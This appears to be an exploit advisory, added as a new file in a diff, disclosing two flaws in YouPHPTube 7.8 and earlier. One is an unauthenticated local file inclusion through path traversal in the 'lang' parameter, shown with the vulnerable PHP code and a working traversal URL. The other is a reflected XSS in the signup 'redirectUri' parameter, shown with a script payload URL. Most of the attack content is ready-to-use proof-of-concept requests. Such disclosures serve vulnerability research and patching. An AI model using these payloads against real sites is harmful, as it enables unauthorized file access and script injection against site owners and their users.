@@ -1,0 +1,89 @@
+id: 38343
+date: 03/28/2023
+title: YouPHPTube <= 7.8 - Multiple Vulnerabilities
+author: Rafael Pedrero
+cves: 
+
+# Exploit Title: YouPHPTube <= 7.8 - Multiple Vulnerabilities
+# Discovery by: Rafael Pedrero
+# Vendor Homepage: https://www.youphptube.com/
+# Software Link : https://www.youphptube.com/
+# Tested Version: 7.8
+# Tested on:  Windows 7, 10 using XAMPP
+
+# Vulnerability Type: LFI + Path Traversal
+
+CVSS v3: 7.5
+CVSS vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+CWE: CWE-829, CWE-22
+
+Vulnerability description: YouPHPTube v7.8 allows unauthenticated directory
+traversal and Local File Inclusion through the parameter in an
+/?lang=PATH+TRAVERSAL+FILE (without php) GET request because of an
+include_once in locale/function.php page.
+
+Proof of concept:
+
+To detect: http://localhost/youphptube/index.php?lang=)
+
+An error is generated:
+
+Warning: preg_grep(): Compilation failed: unmatched parentheses at offset 0
+in C:\xampp\htdocs\YouPHPTube\locale\function.php on line 47
+
+In function.php page, we can see:
+
+// filter some security here
+if (!empty($_GET['lang'])) {
+    $_GET['lang'] = str_replace(array("'", '"', """, "'"),
+array('', '', '', ''), xss_esc($_GET['lang']));
+}
+
+if (empty($_SESSION['language'])) {
+    $_SESSION['language'] = $config->getLanguage();
+}
+if (!empty($_GET['lang'])) {
+    $_GET['lang'] = strip_tags($_GET['lang']);
+    $_SESSION['language'] = $_GET['lang'];
+}
+@include_once
+"{$global['systemRootPath']}locale/{$_SESSION['language']}.php";
+
+
+The parameter "lang" can be modified and load a php file in the server.
+
+
+In Document root: /phpinfo.php with this content:
+
+<?php echo phpinfo(); ?>
+
+
+To Get phpinfo.php: http://127.0.0.1/youphptube/?lang=../../phpinfo
+
+Note: phpinfo without ".php".
+
+The new Path is:
+@include_once "{$global['systemRootPath']}locale/../../phpinfo.php";
+
+And you can see the PHP information into the browser.
+
+
+
+# Vulnerability Type: reflected Cross-Site Scripting (XSS)
+
+CVSS v3: 6.5
+CVSS vector: 3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+CWE: CWE-79
+
+Vulnerability description: YouPHPTube 7.8 and before, does not sufficiently
+encode user-controlled inputs, resulting in a reflected Cross-Site
+Scripting (XSS) vulnerability via the
+/<YouPHPTube_path_directory>/signup?redirectUri=<XSS>, in redirectUri
+parameter.
+
+Proof of concept:
+
+http://localhost/
+<YouPHPTube_path_directory>/signup?redirectUri='"()%26%25<ScRipt>alert(1)</ScRipt>
+
+#  0day.today [2023-04-03]  #
